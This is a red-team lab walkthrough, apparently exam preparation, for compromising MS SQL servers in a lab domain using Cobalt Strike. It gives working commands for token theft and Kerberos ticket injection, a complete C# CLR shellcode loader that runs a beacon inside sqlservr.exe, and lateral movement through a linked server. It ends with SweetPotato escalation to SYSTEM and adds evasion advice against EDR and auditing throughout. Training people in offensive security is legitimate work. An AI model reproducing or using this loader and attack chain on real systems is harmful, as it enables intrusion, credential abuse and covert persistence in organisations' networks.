# SQL Servers Lab

> **Objective:** Gain code execution, move laterally, and escalate privileges across MS SQL servers in the CONTOSO environment.

> **Attack path summary:** Enumerate SQL servers in AD → Find a low-priv user that can't exploit SQL → Find a high-priv user (sysadmin) via group membership → Impersonate that user using Kerberos tickets → Enable SQL CLR → Deploy a .NET assembly payload → Gain beacon inside SQL process → Pivot via SQL linked server to a second SQL host → Escalate to SYSTEM via SeImpersonatePrivilege.

---

# Enumeration

> ⚠️ **Beacon context key used throughout this lab:**
> - `[BEACON: wkstn-1 | USER: pchilds]` — medium-integrity foothold beacon
> - `[BEACON: wkstn-1 | USER: rsteel]` — same beacon after steal_token from rsteel's process
> - `[BEACON: lon-db-1 | USER: mssql_svc]` — CLR beacon inside lon-db-1 sqlservr.exe
> - `[BEACON: lon-db-2 | USER: mssql_svc]` — CLR beacon inside lon-db-2 sqlservr.exe
> - `[BEACON: lon-db-2 | USER: SYSTEM]` — tcp-local beacon after SweetPotato privesc

**phase:** 🔍identify what SQL servers exist, how they authenticate, and what privilege your current user has before attempting any exploitation. Going in blind wastes time and creates unnecessary noise.

1. Launch Cobalt Strike and connect to the team server.

2. Load the SQL-BOF Aggressor script.❗ 
    - Go to **Cobalt Strike > Script Manager**
    - Click **Load**
    - Select `C:\Tools\SQL-BOF\SQL\SQL.cna` 

    > **Why:** SQL-BOF provides `sql-*` commands implemented as Beacon Object Files (BOFs). BOFs run directly inside the beacon thread — no child process is spawned. This makes all subsequent `sql-*` commands `OPSEC-🟢SAFE`.

3. **BEACON: User** — 🔍 MS SQL servers configured for Kerberos authentication.

    ```
    ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
    ```

    > **Why:** LDAP is the authoritative source for SQL server discovery when Kerberos authentication is in use. SQL servers register a `MSSQLSvc/<hostname>:<port>` SPN under their service account in AD. This LDAP filter finds those accounts.  
    > The SPN value (`MSSQLSvc/lon-db-1.contoso.com:1433`) is also what you will use later when requesting Kerberos service tickets — note it now.  
    > `OPSEC-🟢SAFE` LDAP query uses existing domain connection inside the beacon.

4. **BEACON: User** — 🔍 information about the *lon-db-1* instance and your current privileges:

    ```
    sql-info lon-db-1
    sql-whoami lon-db-1
    ```

    > **Why:** `sql-info` reveals the SQL version, authentication mode (Windows = Kerberos), and any linked servers. `sql-whoami` tells you your current SQL login name and role.  
    > `OPSEC-🟢SAFE` — SQL-BOF, no child process.

    > **Expected output:** You are authenticated as `pchilds` but only have `public/guest` privileges — not sysadmin. You cannot run CLR or xp_cmdshell with guest privileges. This tells you impersonation is needed.

5. **BEACON: User** — Find groups that grant sysadmin on the SQL server.

    ```
    ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
    ```

    > Lab-confirmed: `CN=Database Admins` — member: `CN=Robert Steel` (rsteel).

    > **Why:** SQL sysadmin roles are often granted via AD security groups (e.g. a "SQL Admins" group whose members are granted sysadmin at the SQL level). By finding these groups and their membership, you identify which domain account you need to impersonate.  
    > `samAccountType=268435456` = security groups.  
    > `OPSEC-🟢SAFE` — LDAP query only.

    > **Expected output:** A group that contains `rsteel` (or similar user) as a member. This user has sysadmin on lon-db-1.

6. **BEACON: SYSTEM** — Impersonate the *rsteel* user to gain sysadmin access on lon-db-1.

    > **Why:** rsteel has the sysadmin role on lon-db-1 — you need to authenticate to SQL as rsteel. SQL Server uses Windows authentication (Kerberos), so presenting rsteel's Kerberos ticket or access token will make the SQL server treat you as rsteel with full sysadmin.

    **First — check what Kerberos tickets are in memory and find rsteel's processes:**

    ```
    krb_triage
    process_browser
    ```

    > `krb_triage` lists all Kerberos tickets cached on this host. Look for rsteel's TGT (service: `krbtgt`).  
    > `process_browser` shows all running processes with their owner — look for any process running as rsteel.  
    > `OPSEC-🟢SAFE` — BOF-based operations, no child process.

    **Steal rsteel's token from a running process (preferred when a process exists):**

    ```
    steal_token <pid>
    ```

    > Replace `<pid>` with the PID of a process owned by rsteel (found via `process_browser`).  
    > `steal_token` duplicates rsteel's Windows access token into your beacon. Network connections (including SQL auth) will use this token, making SQL see you as rsteel.  
    > `OPSEC-🟢SAFE` — token theft is in-process, no new process spawned.


7. **BEACON: SYSTEM - rsteel** — Verify sysadmin is confirmed on lon-db-1.

    ```
    sql-whoami lon-db-1
    ```
>You can now enable CLR and load assemblies.  


<img src="/images/sql-server-impersonate-user-rsteel-sysadmin.png">  

# Code Execution

**Why this phase:** With sysadmin on lon-db-1, you want to run OS-level code inside the SQL process. SQL CLR loads a .NET assembly into `sqlservr.exe` memory — code executes inside the SQL process with no child process spawned. This is far stealthier than `xp_cmdshell`, which spawns `cmd.exe` as a direct child and is heavily signatured.

1. **BEACON: SYSTEM - rsteel** — Check the status of SQL CLR.

    ```
    sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
    ```

    > **Why:** CLR must be enabled on the SQL instance before it will accept and run assemblies. You check first so you know whether enabling it is a change you're making (which is logged).  
    > `OPSEC-🟠CAUTION` — querying `sys.configurations` is logged if SQL auditing is active.  
    > **Expected output:** `0` = disabled.

2. **BEACON: SYSTEM - rsteel** — Enable SQL CLR on *lon-db-1*.

    ```
    sql-enableclr lon-db-1
    ```

    > **Why:** Required before you can load your .NET assembly. This sets `clr enabled = 1` in SQL Server configuration.  
    > `OPSEC-🟠CAUTION` — configuration change is logged in SQL Server error log and `sys.configurations` history.

3. Generate x64 SMB Beacon shellcode.

    1. **Payloads > Windows Stageless Payload**
    2. Listener: **smb**
    3. Output: **Raw**
    4. Exit Function: **Thread**
    5. x64: ✓
    6. Click **Generate**
    7. Save to `C:\Payloads\smb_x64.xthread.bin`


<img src="/images/sql-server-stageless-payload-smb-raw-thread-bin.png">  

    > **SMB listener:** The SQL server may not have a direct outbound network path to your team server. SMB named pipes work on TCP 445, which is often open internally.  SMB beacon connects back *to you* via a named pipe over SMB — you then link to it from a beacon that already has SMB access to that host.  
    > **Raw output:** The CLR DLL will embed this as raw shellcode bytes — no PE wrapper needed.  
    > **Thread exit function:** If set to Process, the exit kills `sqlservr.exe` — the SQL service crashes and generates a very noisy event. Thread exit terminates only the spawned thread; the SQL process keeps running.

4. Open Visual Studio and create a new `Class Library (.NET Framework)` project:
    1. Project name: `MyProcedure`
    2. Place in the same directory: ✓
    3. Framework: .NET Framework 4.7.2

    > **.NET Framework** SQL Server's CLR runtime only supports .NET Framework assemblies❗   

5. Add `smb_x64.xthread.bin` as an embedded resource.

    > In Solution Explorer: right-click project → Add → Existing Item → select the `.bin` file  
    > Select the file → Properties panel → **Build Action: Embedded Resource**  
    > **embedded resource:** Bundles the shellcode *inside* the DLL binary so no separate file needs to be written to disk when the assembly executes. The shellcode is retrieved from the DLL's resource manifest at runtime.

6. Paste 📝 code into `Class1.cs`:

    ```c#
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using Microsoft.SqlServer.Server;
    
    public partial class StoredProcedures
    {
        [SqlProcedure]
        public static void MyProcedure()
        {
            var assembly = Assembly.GetExecutingAssembly();
    
            byte[] shellcode;
    
            // read embedded payload — name must match: <AssemblyName>.<filename>
            using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
            {
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
    
            // allocate RWX memory inside sqlservr.exe
            var hMemory = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
    
            // copy shellcode into allocated memory
            WriteProcessMemory(
                new IntPtr(-1),
                hMemory,
                shellcode,
                (uint)shellcode.Length,
                out _);
    
            // execute shellcode in a new thread
            var hThread = CreateThread(
                IntPtr.Zero,
                0,
                hMemory,
                IntPtr.Zero,
                THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
                out _);
    
            // close the thread handle — thread continues running (beacon stays alive)
            CloseHandle(hThread);
        }
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            VIRTUAL_ALLOCATION_TYPE flAllocationType,
            PAGE_PROTECTION_FLAGS flProtect);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            THREAD_CREATION_FLAGS dwCreationFlags,
            out uint lpThreadId);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool CloseHandle(IntPtr hObject);
    
        [Flags]
        public enum VIRTUAL_ALLOCATION_TYPE : uint
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x01000000,
            MEM_REPLACE_PLACEHOLDER = 0x00004000,
            MEM_LARGE_PAGES = 0x20000000,
            MEM_RESERVE_PLACEHOLDER = 0x00040000,
            MEM_FREE = 0x00010000,
        }
    
        [Flags]
        public enum PAGE_PROTECTION_FLAGS : uint
        {
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400,
        }
    
        [Flags]
        public enum THREAD_CREATION_FLAGS : uint
        {
            THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
            THREAD_CREATE_SUSPENDED = 0x00000004,
            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
        }
    }
    ```

    > **code:** When SQL Server calls `MyProcedure` as a stored procedure:
    > 1. Reads the embedded `.bin` shellcode from the DLL's resource manifest
    > 2. Allocates RWX (read/write/execute) memory inside `sqlservr.exe`
    > 3. Copies the shellcode bytes into that memory
    > 4. Spawns a thread pointing at the shellcode — this launches the SMB beacon
    > 5. Closes the thread handle (beacon keeps running as a detached thread)
    >
    > The beacon runs inside the `sqlservr.exe` process. No child process is created.  
    > `OPSEC-🟠CAUTION` — `PAGE_EXECUTE_READWRITE` memory allocation is a behavioral detection indicator for many EDRs. In the exam, a custom artifact using indirect syscalls and RW→RX memory transitions is stealthier.  
    >
    > **Important:** The resource name in `GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin")` must match exactly — format is `<ProjectName>.<filename>`. A mismatch returns `null` and the procedure silently fails with a null reference exception.

    Build the project: **Build → Build Solution** (Release mode)  
    Output: `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`


<img src="/images/sql-server-MyProcedure-visual-studio-code-build-release.png">  

7. **BEACON SYSTEM - rsteel** — Load the CLR assembly on *lon-db-1* and execute the stored procedure.

    ```
    sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
    ```

    > ** SQL-BOF does here:** Reads the DLL from your attacker machine, uploads it to the SQL server, enables `TRUSTWORTHY` on the database (required for unsafe assemblies), registers the DLL as a CLR assembly, creates a stored procedure named `MyProcedure` that calls the .NET method, then executes it.  
    > `OPSEC-🟠CAUTION` — `TRUSTWORTHY` database setting change is logged. The CLR assembly registration is visible in `sys.assemblies`. The stored procedure execution is logged if SQL auditing is active.  
    > The beacon will now be running inside `sqlservr.exe` on lon-db-1 as the SQL service account.

8. **BEACON SYSTEM - rsteel** — Link to the Beacon on lon-db-1.

    > **linking is needed:** The SMB beacon is not a reverse HTTP/HTTPS beacon — it does not call out to your team server. Instead, it creates an SMB named pipe and waits. Connect *to it* from a beacon that has SMB access to lon-db-1. Linking creates the communication tunnel: `CS Team Server → your beacon → SMB pipe → SQL beacon`.

    > **requires a CIFS ticket:** SMB named pipe authentication requires a valid `cifs/<hostname>` Kerberos service ticket. If your beacon session doesn't have one, the link will fail with `ERROR_LOGON_FAILURE`.

    **Option 1 — Run `link` from the pchilds' Beacon (simplest path):**

    From the original medium-integrity pchilds beacon:

    ```
    link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
    ```

    > `OPSEC-🟢SAFE` — Windows automatically uses pchilds' cached TGT to request a `cifs/lon-db-1` ticket from the KDC before authenticating the SMB connection. No manual ticket work needed.  
    > The TSVCPIPE name is defined in your CS SMB listener. You can press TAB to autocomplete it.  
    > Run this from **pchilds' beacon**, not from any impersonated session — you need a valid TGT in the session to auto-request CIFS.

    **Option 2 — Manually request a CIFS ticket and inject it (when running from an impersonated context without a usable TGT):**

    Use rsteel's TGT (dumped earlier in the impersonation step) to request a CIFS ticket:

    ```
    krb_asktgs /service:cifs/lon-db-1.contoso.com /ticket:[rsteel-TGT-base64]
    ```

    > This asks the KDC for a `cifs/lon-db-1` service ticket using rsteel's TGT. Note: this is a **different** ticket from the MSSQLSvc ticket — SMB auth uses the `cifs` service class, not `MSSQLSvc`.

    Save the CIFS ticket to disk:

    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[base64-output-from-krb_asktgs]"))
    ```

    Inject and link:

    ```
    kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
    run klist
    link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
    ```

    > `run klist` should show `cifs/lon-db-1.contoso.com` in the ticket list before you attempt to link.  
    > Delete the .kirbi file after linking: `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
    > `OPSEC-🟠CAUTION` — .kirbi file written to disk temporarily.

9. **BEACON SYSTEM - rsteel** — Disable SQL CLR on *lon-db-1* after the beacon is linked.

    ```
    sql-disableclr lon-db-1
    ```

    > **Why:** Clean up. Reverting CLR to disabled reduces your footprint and removes the attack surface from future detection reviews.  
    > `OPSEC-🟢SAFE` — configuration rollback.

<img src="/images/sql-server-load-DLL-link-beacon-cleanup.png">  

# Lateral Movement

**phase:** lon-db-1 has a SQL linked server relationship with lon-db-2. The link uses passthrough Windows auth — the SQL identity used on lon-db-2 depends on WHO connects to lon-db-1's SQL. You must connect as a user that has sysadmin on BOTH servers (rsteel/Database Admins). The `mssql_svc` service account has sysadmin on lon-db-1 but only guest/public on lon-db-2 — running these commands from the lon-db-1 CLR beacon will fail.

> ⚠️ **BEACON CONTEXT IS CRITICAL for this phase.** Each command below is labelled:
> - `[BEACON: wkstn-1 | USER: rsteel]` — run from your original foothold beacon impersonating rsteel
> - `[BEACON: lon-db-1 | USER: mssql_svc]` — run from the CLR beacon inside lon-db-1's sqlservr.exe
> - `[BEACON: lon-db-2 | USER: mssql_svc]` — run from the CLR beacon inside lon-db-2's sqlservr.exe

---

1. **BEACON - SYSTEM rsteel** — Confirm rsteel is still impersonated, then enumerate SQL links on *lon-db-1*.

    ```cs
    getuid    // must show CONTOSO\rsteel — re-run steal_token <rsteel-pid> if not
    sql-links lon-db-1
    ```

    > OPSEC-🟢SAFE — SQL-BOF, no child process. Expected: `LON-DB-2 | SQL Server | SQLNCLI | LON-DB-2`.

2. **BEACON - SYSTEM rsteel** — Verify rsteel has sysadmin on *lon-db-2* via the link.

    ```cs
    sql-whoami lon-db-1 "" lon-db-2
    ```

    > ⚠️  Expected output (as rsteel): `sysadmin role` on lon-db-2.

3. **BEACON wkstn-1 SYSTEM rsteel** — Check RPC Out status on the link.

    ```cs
    sql-checkrpc lon-db-1
    ```

    > Expected: `LON-DB-2 | is_rpc_out_enabled: 0` — must enable before CLR relay works.

4. **BEACON wkstn-1 SYSTEM rsteel** — Enable RPC Out on the link to *lon-db-2*.

    ```cs
    sql-enablerpc lon-db-1 lon-db-2
    ```

    > OPSEC-🟠CAUTION — link config change logged in SQL Server error log and `sys.servers`.


<img src="/images/sql-server-lateral-movement-enable-RPC-link.png">  



5. **BEACON 💻wkstn-1 ❗ SYSTEM  CONTOSO\rsteel💡** — Execute the SQL CLR payload on `lon-db-2` via `lon-db-1`.

```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

    > ⚠️   The SQL-BOF connects to lon-db-1 using the beacon's Windows identity. From the lon-db-1 mssql_svc beacon, the connection authenticates as mssql_svc (guest on lon-db-2) → `42000: The user does not have permission`. From the wkstn-1 rsteel beacon, the connection authenticates as rsteel (sysadmin on both) → success.


    > Wait ~10 seconds for beacon to spawn inside lon-db-2's sqlservr.exe before linking.
    > OPSEC-🟠CAUTION — TRUSTWORTHY setting change and assembly registration logged on lon-db-2.  
    

<img src="/images/sql-server-sql-clr-lon-db-1-MyProcedure-dll-lon-db-2.png">  


6. **BEACON 💻lon-db-1 ❗ mssql_svc** — Link to the beacon on *lon-db-2*.

    Switch to the **lon-db-1 CLR beacon**, then:

    ```cs
    link lon-db-2 <smb-listener-pipe-name>
    ```

> ⚠️ run from **lon-db-1 beacon** — lon-db-2 is on a separate network segment not reachable from wkstn-1 via SMB. lon-db-1 has direct network adjacency to lon-db-2 (SQL link already proved TCP 1433 connectivity; mssql_svc has CIFS access to lon-db-2).  

> This builds the chain: `CS Team Server ↔ wkstn-1 beacon ↔ lon-db-1 SMB beacon ↔ lon-db-2 SMB beacon`.
`[+] established link to child beacon: 10.10.120.25`
> OPSEC-🟢SAFE — SMB named pipe connection, no new process spawned.  

7. **BEACON 💻 wkstn-1 ❗SYSTEM  CONSTOSO\rsteel - admin** — Disable RPC Out after beacon is linked.

    ```cs
    sql-disablerpc lon-db-1 lon-db-2
    ```

    > Clean up — revert RPC Out to reduce configuration footprint.

---

> ⚠️ **Trap** If `sql-clr ... "" lon-db-2` is run from the **lon-db-1 mssql_svc beacon**, it fails with `42000: The user does not have permission to perform this action`. This leaves a dirty hash in `sys.trusted_assemblies` on lon-db-2. On the next clean attempt (from rsteel context), SQL-BOF detects and drops the leftover hash automatically — allow it to proceed.

---

# Privilege Escalation

**Why this phase:** The beacon running inside `sqlservr.exe` on lon-db-2 is running as the MSSQL service account (`NT Service\MSSQLSERVER`). This account has `SeImpersonatePrivilege` enabled by design — SQL Server requires it to impersonate client connections. SweetPotato exploits this privilege to get a SYSTEM token and run an arbitrary process as SYSTEM.

1. Interact with the **lon-db-2 CLR beacon** in CS.

2. **BEACON: lon-db-2 USER: mssql_svc** — Check the service account identity.

    ```    
    getuid
    whoami
    ```

    > Lab-confirmed: `CONTOSO\mssql_svc`. SweetPotato requires `SeImpersonatePrivilege` — present by design on all SQL service accounts.

    > **Expected output:** `NT Service\MSSQLSERVER` (or similar SQL service account).  
    > The BOF output will include `SeImpersonatePrivilege: Enabled`.  
    > **Why this matters:** `SeImpersonatePrivilege` is the Potato family prerequisite. Any local service account with this privilege can impersonate SYSTEM via DCOM/COM authentication coercion.

3. Generate a TCP (localhost-only) executable payload.

    1. **Payloads > Windows Stageless Payload**
    2. Listener: **tcp-local**
    3. Output: Windows Executable
    4. Exit Function: Process
    5. x64: ✓
    6. Click **Generate**
    7. Save to `C:\Payloads\tcp-local_x64.exe`

    > **Why tcp-local:** lon-db-2 is on a separate network segment with no outbound path to your team server. `tcp-local` binds only to `127.0.0.1` — the beacon is reached via the existing beacon chain (lon-db-1's beacon connects to it locally on lon-db-2), not directly from your attacker machine.  
    > **Why Process exit:** After SweetPotato runs the EXE and the beacon connects back, the EXE can exit. The beacon communicates through the chain, not via this process.

<img src="/images/sql-server-privilege-escalation-tcp-local-payload.png">  

4. **BEACON: lon-db-2 USER: mssql_svc** — Change working directory to MSSQL service profile (mssql_svc owns it, less monitored than Temp).

    ```
    cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
    ```

    > **directory:** The MSSQL service account has write access to its own service profile directory. `WindowsApps` within it is less aggressively monitored by Defender compared to `C:\Windows\Temp` or `C:\Users\Public`. The MSSQL service account owns this path so no permission errors.  




5. **BEACON: lon-db-2  USER: mssql_svc** — Upload the tcp-local payload.

    ```
    upload C:\Payloads\tcp-local_x64.exe
    ```

    > `OPSEC-🟠CAUTION` — file write to disk. Defender may flag the EXE. Custom artifact required in exam.

6. **BEACON: lon-db-2  USER: mssql_svc** — Execute the payload using SweetPotato to abuse SeImpersonatePrivilege.

    ```
    execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
    ```

    **PrintSpoofer** method (`-i` NP impersonation):
    > ```
    > [+] Triggering notification on evil PIPE \\lon-db-2/pipe/...
    > [+] Server connected to our evil RPC pipe
    > [+] Duplicated impersonation token ready for process creation
    > [+] Intercepted and authenticated successfully, launching program
    > [+] Process created, enjoy!
    > ```

    > **SweetPotato**
    > 1. Creates a fake COM server on the local machine
    > 2. Coerces a privileged Windows service (SYSTEM) to authenticate to the fake COM server via DCOM
    > 3. Captures the SYSTEM authentication token using `SeImpersonatePrivilege`
    > 4. Calls `CreateProcessWithTokenW` to run your EXE under the impersonated SYSTEM token
    >
    > Result: `tcp-local_x64.exe` runs as `NT AUTHORITY\SYSTEM`.  
    > `OPSEC-🟠CAUTION` — `execute-assembly` uses fork & run (spawns a sacrificial process). For the exam, ensure your malleable profile has `spawnto` set to a non-signatured binary (e.g. `dllhost.exe`).

7. **BEACON: lon-db-2 USER: mssql_svc** — Connect to the new SYSTEM beacon.

    ```
    connect localhost 1337
    ```

    > Lab-confirmed: `[+] established link to child beacon: 10.10.120.25` → `NT AUTHORITY\SYSTEM` on lon-db-2.

    > **localhost:** The tcp-local beacon bound to `127.0.0.1:1337` on lon-db-2. Since you are already running a beacon on lon-db-2 (the MSSQL one), `connect localhost 1337` reaches the SYSTEM beacon from within the same host.  
    > `OPSEC-🟢SAFE` — loopback TCP connection, no external traffic.  
    > Port `1337` is defined in your `tcp-local` listener configuration.

> **Lab complete.** LDAP-based SQL server enumeration, Kerberos ticket impersonation to gain sysadmin, SQL CLR payload execution for code execution inside the SQL process, lateral movement via SQL linked servers across network segments, and privilege escalation from SQL service account to SYSTEM via SeImpersonatePrivilege.

<img src="/images/sql-servers-linked-lab-final-view.png" width=860>
